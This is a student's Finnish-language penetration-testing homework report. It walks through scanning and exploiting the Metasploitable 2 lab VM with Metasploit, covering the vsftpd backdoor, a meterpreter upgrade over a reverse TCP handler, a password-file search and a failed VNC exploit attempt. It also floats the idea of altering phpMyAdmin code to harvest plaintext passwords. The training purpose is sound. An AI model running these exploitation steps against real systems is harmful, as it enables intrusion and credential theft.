# Lisää vain vesi
## Johdanto
Kotitehtävä h2 Lisää vain vesi Tero Karvisen Tunkeutumistestaus 2025 syksy -kurssille. [Linkki kurssisivulle](https://terokarvinen.com/tunkeutumistestaus/)
Alla kokonaisuudessaan tehtävänanto, mikä on otettu kurssisivulta

h2 Lisää vain vesi
x) Lue/katso/kuuntele ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)
€ Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit (kohdasta Conducting a penetration test with Metasploit luvun loppuun eli "Summary" loppuun)
a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, että 1) koneet eivät saa yhteyttä Internetiin 2) Koneet saavat yhteyden toisiinsa. (Koneiden ja verkon asentamista ei tarvitse raportoida uudestaan, paitsi jos siinä on ongelmia)

b) Ota Metasploit msfconsole käyttöön

c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable.

d) Porttiskannaa Metasploitable perusteellisesti. Skannaa kaikki 65535 tcp-porttia. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo).

e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.

f) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

g) Murtaudu Metasploitablen vsftpd-palveluun

h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin

i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.

j) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).

k) Demonstroi Meterpretrin ominaisuuksia.

l) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt)

m) Vapaaehtoinen: Titityy. Saatko Metasploitableen tty-shellin, eli esimerkiksi avattua koko ruudulle piirtävän nano:n?

n) Vapaaehtoinen, vaikea: Kokeile jotain kilpailevaa hyökkäystyökalua tai vihamielistä etäkäyttötyökalua, kuten Sliver

o) Vapaaehtoinen, vaikea: Asenna ja korkkaa Metasploitable 3. Karvinen 2018: Install Metasploitable 3 – Vulnerable Target Computer
## Tehtävät
### x) Lue ja tiivistä
Kirja näyttää kokonaisuudessaan erittäin laajalta ja varmasti se kannattaisikin lukea ajatuksella alusta loppuun ihan kokonaan. Ihan vain lukemalla ensimmäisestä kappaleesta suurimman osan, huomasin kuinka paljon tietoa tästä kirjasta saa. Itselle jäi tästä parhaiten mieleen se, että tätä lukutehtävää ei olisi kannattanut jättää viimeiseksi. Olisi varmasti ollut kivempaa tehdä tehtäviä lukemisen jälkeen eikä toisinpäin :). 
### a) Alkujärjestelyt 
Aluksi testasin, että koneet eivät saa yhteyttä internettiin. 

    ping 8.8.8.8
Kumpikaan kone ei saanut yhteyttä internettiin. Tämän jälkeen testasin, että koneet saavat yhteyden toisiinsa.

    ip a
    ping 192.168.56.101
    ping 192.168.56.102
<img width="712" height="1320" alt="image" src="https://github.com/user-attachments/assets/73c46e3b-9fe3-448a-bca8-13ccbbe3e84f" />

### b&c Metasploit käyttöön ja Metasploitablen ip:n löytäminen
Samalla kun käynnistin msfconsolen, loin tietokannan jota tulin tarvitsemaan seuraavissa tehtävissä.

    sudo msfdb init
    sudo msfconsole

Seuraavaksi runasin komennon, millä löysin Metasploitablen ip:n, joka on samassa verkossa.

    db_nmap -sn 192.168.56.0/24
    
<img width="725" height="505" alt="image" src="https://github.com/user-attachments/assets/2d19e828-bcdf-4848-b153-3b9cccfee399" />

Metasploitablem ip on joko 192.168.56.102 tai 192.168.56.100, sillä  192.168.56.101 on Kalin ip. Curlasin molemmat, josta selvisi että Metasploitablen ip on 192.168.56.101 

    msf > curl 192.168.56.100
    [*] exec: curl 192.168.56.100
    
    curl: (7) Failed to connect to 192.168.56.100 port 80 after 0 ms: Could not connect to server
    msf > curl 192.168.56.102
    [*] exec: curl 192.168.56.102
    
    <html><head><title>Metasploitable2 - Linux</title></head><body>
    <pre>
    
                    _                  _       _ _        _     _      ____  
     _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
    | '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
    | | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
    |_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                                |_|                                          
    
    
    Warning: Never expose this VM to an untrusted network!
    
    Contact: msfdev[at]metasploit.com
    
    Login with msfadmin/msfadmin to get started
    
    
    </pre>
    <ul>
    <li><a href="/twiki/">TWiki</a></li>
    <li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
    <li><a href="/mutillidae/">Mutillidae</a></li>
    <li><a href="/dvwa/">DVWA</a></li>
    <li><a href="/dav/">WebDAV</a></li>
    </ul>
    </body>
    </html>

### d) Metasploitablen skannaus 
Seuraavaksi skannasin Metasploitablen huolellisesti. Koska käynnistimme msfconsole sudona, ei minun tarvitse käyttää sudoa nmapin komennossa. Ensimmäiseksi tallennetaan skannaus tietokantaan.

    db_nmap -A -T4 -p- 192.168.56.102

Seuraavaksi tallennetaan sama skannaus tiedostoon. Ennen tätä kuitenkin, poistuin msfconsolesta exit komennolla. Tämä siksi, että pystyn tallentamaan tiedostot Kaliin. 

    sudo nmap -A -T4 -p- 192.168.56.102 -oA foo

Tiedostot tallentuivat kotihakemistoon.

    ┌──(ttma㉿tuntem)-[~]
    └─$ ls -l foo.*
    -rw-r--r-- 1 root root  1821 Aug 31 20:56 foo.gnmap
    -rw-r--r-- 1 root root  5919 Aug 31 20:56 foo.nmap
    -rw-r--r-- 1 root root 24261 Aug 31 20:56 foo.xml
         

### e)
Hosts ja services näyttävät tältä, jos niihin ei lisätä mitään parametreja.

    msf > hosts
    
    Hosts
    =====
    
    address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
    -------         ---                ----  -------  ---------  -----  -------  ----  --------
    192.168.56.1    0A:00:27:00:00:06
    192.168.56.100  08:00:27:E1:90:C0
    192.168.56.101
    192.168.56.102  08:00:27:20:83:59        Linux               2.6.X  server
    
    msf > services
    Services
    ========
    
    host            port   proto  name         state  info
    ----            ----   -----  ----         -----  ----
    192.168.56.102  21     tcp    ftp          open   vsftpd 2.3.4
    192.168.56.102  22     tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
    192.168.56.102  23     tcp    telnet       open   Linux telnetd
    192.168.56.102  25     tcp    smtp         open   Postfix smtpd
    192.168.56.102  53     tcp    domain       open   ISC BIND 9.4.2
    192.168.56.102  80     tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
    192.168.56.102  111    tcp    rpcbind      open   2 RPC #100000
    192.168.56.102  139    tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
    192.168.56.102  445    tcp    netbios-ssn  open   Samba smbd 3.0.20-Debian workgroup: WORKGROUP
    192.168.56.102  512    tcp    exec         open   netkit-rsh rexecd
    192.168.56.102  513    tcp    login        open
    192.168.56.102  514    tcp    shell        open   Netkit rshd
    192.168.56.102  1099   tcp    java-rmi     open   GNU Classpath grmiregistry
    192.168.56.102  1524   tcp    bindshell    open   Metasploitable root shell
    192.168.56.102  2049   tcp    nfs          open   2-4 RPC #100003
    192.168.56.102  2121   tcp    ftp          open   ProFTPD 1.3.1
    192.168.56.102  3306   tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
    192.168.56.102  3632   tcp    distccd      open   distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
    192.168.56.102  5432   tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
    192.168.56.102  5900   tcp    vnc          open   VNC protocol 3.3
    192.168.56.102  6000   tcp    x11          open   access denied
    192.168.56.102  6667   tcp    irc          open   UnrealIRCd
    192.168.56.102  6697   tcp    irc          open   UnrealIRCd
    192.168.56.102  8009   tcp    ajp13        open   Apache Jserv Protocol v1.3
    192.168.56.102  8180   tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
    192.168.56.102  8787   tcp    drb          open   Ruby DRb RMI Ruby 1.8; path /usr/lib/ruby/1.8/drb
    192.168.56.102  33623  tcp    mountd       open   1-3 RPC #100005
    192.168.56.102  37018  tcp    java-rmi     open   GNU Classpath grmiregistry
    192.168.56.102  40384  tcp    nlockmgr     open   1-4 RPC #100021
    192.168.56.102  58385  tcp    status       open   1 RPC #100024

Servicestä löysin muutaman hyvä parametrin lukemalla servicen help pagea 
- Voi etsiä porttia tai porttia väliltä x-y parametrilla --port
- Kirjainjonolla mikä esiintyy info kolumnissa -S


        msf > services --port 22
        Services
        ========
        
        host            port  proto  name  state  info
        ----            ----  -----  ----  -----  ----
        192.168.56.102  22    tcp    ssh   open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
        
        msf > services --port 22-53
        Services
        ========
        
        host            port  proto  name    state  info
        ----            ----  -----  ----    -----  ----
        192.168.56.102  22    tcp    ssh     open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
        192.168.56.102  23    tcp    telnet  open   Linux telnetd
        192.168.56.102  25    tcp    smtp    open   Postfix smtpd
        192.168.56.102  53    tcp    domain  open   ISC BIND 9.4.2
        
        msf > services -S sql
        Services
        ========
        
        host            port  proto  name        state  info
        ----            ----  -----  ----        -----  ----
        192.168.56.102  3306  tcp    mysql       open   MySQL 5.0.51a-3ubuntu5
        192.168.56.102  5432  tcp    postgresql  open   PostgreSQL DB 8.3.0 - 8.3.7
        
        msf > 



Seuraavaksi lähdin tutkimaan mitä hienouksia hosts komennon parametreista löytyy samalla tavalla kuin hosts kanssa, eli help pagelta
- -O, Kirjainjonolla mikä esiintyy info/os/comments kolumnissa 
- -m, pystyy lisäämään kommentin

        msf > hosts -S Linux
        
        Hosts
        =====
        
        address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
        -------         ---                ----  -------  ---------  -----  -------  ----  --------
        192.168.56.102  08:00:27:20:83:59        Linux               2.6.X  server         Metasploitable
        
        msf > hosts -R 192.168.56.102 -m "Metasploitable testikone"
        msf > hosts -S "testikone"
        
        Hosts
        =====
        
        address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
        -------         ---                ----  -------  ---------  -----  -------  ----  --------
        192.168.56.102  08:00:27:20:83:59        Linux               2.6.X  server         Metasploitable testikone
        
        msf > 

### f) db_nmap vs tiedostot
Parametri -oA tallensi tiedostot kolmeen eri muotoon
- .nmap. Tämä tallentaa saman nmap raportin minkä näet outputtina tiedostoon. Tässä hyvää se, että ihmisen on helppo lukea sitä.
- .gnmap. Katsoin tiedoston ja en ymmärtäny täysin mikä on kyseisen tiedoston käyttötarkoitus. Nopealla googlauksella löysin sen käyttötarkoituksen [Täältä](https://cornerpirate.com/2016/12/15/working-with-nmap-summariser-nmap-grepper/) . gnmap = greppable nmap. Eli tiedosto on hyvä greppaukseen.
- .xml. Tiedosto on helppo syöttää eri työkaluihin.
Tallennetut tiedostot on helppo viedä eri softaan analysoitaviksi ja pitää tallessa.

Metasploitin tietokantaan tallennuksessa isoin hyöty on se, että se avaa sinulle suuren työkalupakin. Esimerkiksi aikaisemmin käytetyt hosts ja services. 

### g)
Tämä oli helpommin sanottu kuin tehty. Muistin kuitenkin about miten tämä meni tunnilla käydyssä esimerkissä. Ensiksi tein uuden workspacen

    msf > workspace -a metasploit_vsftpd

Tämä vaihtoi samalla workspacen juuri luotuun workspaceen, joten siihen ei erikseen pitänyt siirtyä. 

Seuraavaksi etsin vsftpd haavoittuvuuksia

<img width="808" height="185" alt="image" src="https://github.com/user-attachments/assets/736bfbae-745d-4a00-948f-61761d8b6bf5" />

Päätin jatkaa exploitilla 1, joka on backdoor/command execution exploit. Toinen exploitti olisi liittynyt palvelunestohyökkäykseen.
Seuraavaksi otin valitsemani exploitin käyttöön.

    use 1
Seuraavaksi olisin valinnut hostin, mutta komennolla hosts mitään ei ilmaantunut. 

    msf exploit(unix/ftp/vsftpd_234_backdoor) > hosts

    Hosts
    =====
    
    address  mac  name  os_name  os_flavor  os_sp  purpose  info  comments
    

Pähkäilin hetken ongelmaa, kunnes tajusin että tämä johtuu workspacen vaihdosta. Joten runasin uudestaan db_nmap komennon ja palasin hostin valitsemis vaiheeseen.

    db_nmap -A -T4 -p- 192.168.56.102
    search vsftpd
    use 1
Nyt Metasploit löytyy!

    msf exploit(unix/ftp/vsftpd_234_backdoor) > hosts
    
    Hosts
    =====
    
    address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
    -------         ---                ----  -------  ---------  -----  -------  ----  --------
    192.168.56.102  08:00:27:20:83:59        Linux               2.6.X  server
    
Nyt pystyin valitsemaan sen hyökkäyksen kohteeksi

    setg RHOSTS 192.168.56.102

Tämän jälkeen heitin tikan tauluun ja toivoin parasta.

<img width="808" height="718" alt="image" src="https://github.com/user-attachments/assets/7efad937-e7b3-43cc-9a26-332748c75a7b" />

    
Kuten näkyy, hyökkäys onnistui. 

### h) Session päivitys meterpreteriin

Heitin kyseisen session lepoon ctrl+z komennolla. Muistin tunnilta, että päivittäminen oli yllättävän helppoa, joten lähdin selvittämään sitä sessions -h komennolla. Täältä löytyikin -u parametri, jolla voisi ainaskin yrittää session päivittämistä.
    
    msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
    [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on 192.168.56.101:4433 
    [*] Sending stage (1062760 bytes) to 192.168.56.102
    [*] Command stager progress: 100.00% (773/773 bytes)
    
Sähläsin jotain näppäimistöllä ja jotain meni pieleen. Poistin saadun session 2 ja runasin komennoin uudestaan.    
    
<img width="802" height="510" alt="image" src="https://github.com/user-attachments/assets/7497c91d-4679-4f66-ad67-b04de1bc25c8" />
    
Session päivittäminen onnistui meterpreteriin.
### i) Lateral movement
Tämä oli vähän sekava kohta. Itsellenni tuli mieleen, että voisin lähteä etsimään järjestelmästä salasana tiedostoja jos sieltä löytyisi jotain kivaa.

    search -f *pass*
ja sieltä tuli iso lista tiedostoja ja lähdin sitten lukemaan niistä muutamaan mielenkiintoisemman. Löysinkin tiedoston tästä sijainnista */var/www/phpMyAdmin/user_password.php*. Nopean googlauksen avulla selvisi, että kyseessä on open-source softa, jonka avulla MySQL tietokantoja voi hallita netin kautta. Katsoin koodia ja ymmärsin sen, että kyseessä on koodi, jonka avulla kyseisen palvelun käyttäjien salasanan vaihtaminen toimii. En ole mikään koodi expertti, joten kysyin ChatGPT tekoälyltä mitä kyseinen koodinpätkä tekee. Chatgpt tuli kanssani samaan johtopäätökseen, että mihin koodi oli tarkoitettu. Mieleeni pamahtikin idea, että entä jos koodia pystyisi muokkaamaan jollain tavalla. Esimerkiksi siten, että salasana tallennetaakin myös x sijaintiin plain textina tai jotain muuta sellaista, jolla saadaan käyttäjien salasanoja. On hyvin todennäköistä että käyttäjällä on sama käyttäjätunnus sekä salasana käytössä muuallakin. Tämä olisi periaatteessa mahdollista, jos minulla olisi root oikeudet. Varmaan helpompiakin tapoja olisi saada lateral movementia, kuin muokata x palvelun salasananvaihtosivun lähdekoodia. 

    meterpreter > ls -la /var/www/phpMyAdmin/user_password.php
    100644/rw-r--r--  4587  fil  2008-12-09 18:24:00 +0100  /var/www/phpMyAdmin/user_password.php

Koodissa oli myös pätkä, mikä viittaisi siihen että kyseinen lähdekoodi on 2008 vuodelta. Veikkaan, että tähän löytyy erittäin monta exploittia netistä, jota voisi käyttää hyödyksi. Alla vielä kyseinen koodinpätkä, mikäli sikäli se jotain kiinnostaa.

    meterpreter > cat /var/www/phpMyAdmin/user_password.php
    <?php
    /* vim: set expandtab sw=4 ts=4 sts=4: */
    /**
     * displays and handles the form where the user can change his password
     * linked from main.php
     *
     * @uses    $GLOBALS['strUpdateProfileMessage']
     * @uses    $GLOBALS['strBack']
     * @uses    $GLOBALS['js_include']
     * @uses    $GLOBALS['strChangePassword']
     * @uses    $GLOBALS['strPasswordEmpty']
     * @uses    $GLOBALS['strPasswordNotSame']
     * @uses    $GLOBALS['strError']
     * @uses    $GLOBALS['strNoRights']
     * @uses    $cfg['ShowChgPassword']
     * @uses    $cfg['Server']['auth_type']
     * @uses    PMA_DBI_select_db()
     * @uses    PMA_DBI_try_query()
     * @uses    PMA_DBI_getError()
     * @uses    PMA_sanitize()
     * @uses    PMA_generate_common_url()
     * @uses    PMA_isValid()
     * @uses    PMA_mysqlDie()
     * @uses    PMA_setCookie()
     * @uses    PMA_blowfish_encrypt()
     * @uses    PMA_showMessage()
     * @uses    define()
     * @version $Id: user_password.php 11378 2008-07-09 15:24:44Z lem9 $
     */
    
    /**
     * no need for variables importing
     */
    if (! defined('PMA_NO_VARIABLES_IMPORT')) {
        define('PMA_NO_VARIABLES_IMPORT', true);
    }
    
    /**
     * Gets some core libraries
     */
    require_once './libraries/common.inc.php';
    
    /**
     * Displays an error message and exits if the user isn't allowed to use this
     * script
     */
    if (!$cfg['ShowChgPassword']) {
        $cfg['ShowChgPassword'] = PMA_DBI_select_db('mysql');
    }
    if ($cfg['Server']['auth_type'] == 'config' || !$cfg['ShowChgPassword']) {
        require_once './libraries/header.inc.php';
        PMA_Message::error('strNoRights')->display();
        require_once './libraries/footer.inc.php';
    } // end if
    
    
    /**
     * If the "change password" form has been submitted, checks for valid values
     * and submit the query or logout
     */
    if (isset($_REQUEST['nopass'])) {
        // similar logic in server_privileges.php
        $_error = false;
    
        if ($_REQUEST['nopass'] == '1') {
            $password = '';
        } elseif (empty($_REQUEST['pma_pw']) || empty($_REQUEST['pma_pw2'])) {
            $message = PMA_Message::error('strPasswordEmpty');
            $_error = true;
        } elseif ($_REQUEST['pma_pw'] != $_REQUEST['pma_pw2']) {
            $message = PMA_Message::error('strPasswordNotSame');
            $_error = true;
        } else {
            $password = $_REQUEST['pma_pw'];
        }
    
        if (! $_error) {
    
            // Defines the url to return to in case of error in the sql statement
            $_url_params = array();
    
            $err_url          = 'user_password.php' . PMA_generate_common_url($_url_params);
            if (PMA_isValid($_REQUEST['pw_hash'], 'identical', 'old')) {
                $hashing_function = 'OLD_PASSWORD';
            } else {
                $hashing_function = 'PASSWORD';
            }
    
            $sql_query        = 'SET password = ' . (($password == '') ? '\'\'' : $hashing_function . '(\'***\')');
            $local_query      = 'SET password = ' . (($password == '') ? '\'\'' : $hashing_function . '(\'' . PMA_sqlAddslashes($password) . '\')');
            $result           = @PMA_DBI_try_query($local_query)
                or PMA_mysqlDie(PMA_DBI_getError(), $sql_query, false, $err_url);
    
            // Changes password cookie if required
            // Duration = till the browser is closed for password (we don't want this to be saved)
            if ($cfg['Server']['auth_type'] == 'cookie') {
                PMA_setCookie('pmaPass-' . $server,
                    PMA_blowfish_encrypt($password, $GLOBALS['cfg']['blowfish_secret']));
            } // end if
    
            // For http auth. mode, the "back" link will also enforce new
            // authentication
            if ($cfg['Server']['auth_type'] == 'http') {
                $_url_params['old_usr'] = 'relog';
            }
    
            // Displays the page
            require_once './libraries/header.inc.php';
            echo '<h1>' . $strChangePassword . '</h1>' . "\n\n";
            PMA_showMessage($strUpdateProfileMessage, $sql_query, 'success');
            ?>
            <a href="index.php<?php echo PMA_generate_common_url($_url_params); ?>" target="_parent">
                <strong><?php echo $strBack; ?></strong></a>
            <?php
            require_once './libraries/footer.inc.php';
        } // end if
    } // end if
    
    
    /**
     * If the "change password" form hasn't been submitted or the values submitted
     * aren't valid -> displays the form
     */
    // Loads the headers
    $GLOBALS['js_include'][] = 'server_privileges.js';
    require_once './libraries/header.inc.php';
    echo '<h1>' . $strChangePassword . '</h1>' . "\n\n";
    
    // Displays an error message if required
    if (isset($message)) {
        $message->display();
    }
    
    require_once './libraries/display_change_password.lib.php';
    
    /**
     * Displays the footer
     */
    require_once './libraries/footer.inc.php';
    ?>
### Metasploittin tunkeutuminen toisella tavalla
Menin takaisin msfconsoleen ja katsoin mitä muita palveluita koneella on auki.

    sudo msfconsole
    services
Päätin katsoa jos portista 5900 löytyisi joku valmis exploitti metasploitista, jota voisin hyödyntää.

    192.168.56.102  5900   tcp    vnc          open   VNC protocol 3.3
    msf > search vnc exploit
    
    Matching Modules
    ================
    
       #   Name                                           Disclosure Date  Rank       Check  Description
       -   ----                                           ---------------  ----       -----  -----------
       0   exploit/linux/misc/igel_command_injection      2021-02-25       excellent  Yes    IGEL OS Secure VNC/Terminal Command Injection RCE
       1     \_ target: Secure Terminal Service           .                .          .      .
       2     \_ target: Secure Shadow Service             .                .          .      .
       3   exploit/multi/misc/legend_bot_exec             2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
       4   exploit/windows/vnc/realvnc_client             2001-01-29       normal     No     RealVNC 3.3.7 Client Buffer Overflow
       5     \_ target: Windows 2000 SP4 English          .                .          .      .
       6     \_ target: Windows XP SP2 English            .                .          .      .
       7     \_ target: Windows 2003 SP1 English          .                .          .      .
       8   auxiliary/admin/vnc/realvnc_41_bypass          2006-05-15       normal     No     RealVNC NULL Authentication Mode Bypass
       9   auxiliary/scanner/http/thinvnc_traversal       2019-10-16       normal     No     ThinVNC Directory Traversal
       10  exploit/windows/vnc/ultravnc_client            2006-04-04       normal     No     UltraVNC 1.0.1 Client Buffer Overflow
       11    \_ target: Windows 2000 SP4 English          .                .          .      .
       12    \_ target: Windows XP SP2 English            .                .          .      .
       13    \_ target: Windows 2003 SP1 English          .                .          .      .
       14  exploit/windows/vnc/ultravnc_viewer_bof        2008-02-06       normal     No     UltraVNC 1.0.2 Client (vncviewer.exe) Buffer Overflow
       15  exploit/multi/vnc/vnc_keyboard_exec            2015-07-10       great      No     VNC Keyboard Remote Code Execution
       16    \_ target: VNC Windows / Powershell          .                .          .      .
       17    \_ target: VNC Windows / VBScript CMDStager  .                .          .      .
       18    \_ target: VNC Linux / Unix                  .                .          .      .
       19  exploit/windows/vnc/winvnc_http_get            2001-01-29       average    No     WinVNC Web Server GET Overflow
       20    \_ target: Windows NT4 SP3-6                 .                .          .      .
       21    \_ target: Windows 2000 SP1-4                .                .          .      .
       22    \_ target: Windows XP SP0-1                  .                .          .      .
    
Exploitti 0 näyttää hyvältä, se on RCE ja on Linuxille (Ainakin näin sen tulkitsin). Ei muuta kuin testaamaan!
<img width="1058" height="348" alt="image" src="https://github.com/user-attachments/assets/4ea5efe3-2ac0-497e-b330-7046cb5a3079" />

Erroriahan se tuotti. En ollut asettanut LHOSTIA. Googletin "metasploit LHOST" ja sieltä löytyikin hyvä artikkeli [Lue tästä](https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control). Sieltä löysin vastauksen ongelmaan, LHOST=localhost. Minun piti siis asettaa localhosti, jotta hyökättävä kone voisi ottaa yhteyden johonkin koneeseen, josta sitä voisi käyttää jos hyökkäys onnistuu. Tässä tapauksessa localhost 127.0.0.1. Testataan uudestaan jos nyt onnistuisi!
<img width="1164" height="125" alt="image" src="https://github.com/user-attachments/assets/e6678ef0-dc67-4698-88cb-e0b24ee016eb" />
Erroriahan sieltä taas tuli. Vissiin kyseistä exploittia ei voi käyttää varmasti. En halua nyt rikkoa testiympäristöä forceamalla exploittia. 

### Meterpreterin ominaisuuksia
Koska en päässyt murtautumaan uudella tavalla, näytän meterpreterin ominaisuuksia aiemman shellin avulla

    sessions 3
Alla muutama perus komento, mitkä toimivat meterpreterissä, mutta ei exploitista saadulla normaalissa shellissä
- getuid = Nähdään oikeudet, tässä tapauksessa root
- sysinfo = Järjestelmän tiedot
Koska minulla on root oikeudet, pystyn esimerkiksi tekemään kansioita tai muokkaamaan tiedostoja. Pystyn myös lataamaan tiedostoja komennolla

        download /tiedoston/sijainti /minne/haluat/tiedoston
<img width="1495" height="136" alt="image" src="https://github.com/user-attachments/assets/392c8072-f6b4-4daa-b962-53ff8a5e5bbb" />


## Lähteet
https://terokarvinen.com/tunkeutumistestaus/

https://cornerpirate.com/2016/12/15/working-with-nmap-summariser-nmap-grepper/

https://www.phpmyadmin.net/

ChatGPT tekoäly, malli GPT-5

https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control

https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/

https://www.offsec.com/metasploit-unleashed/meterpreter-basics/

https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/
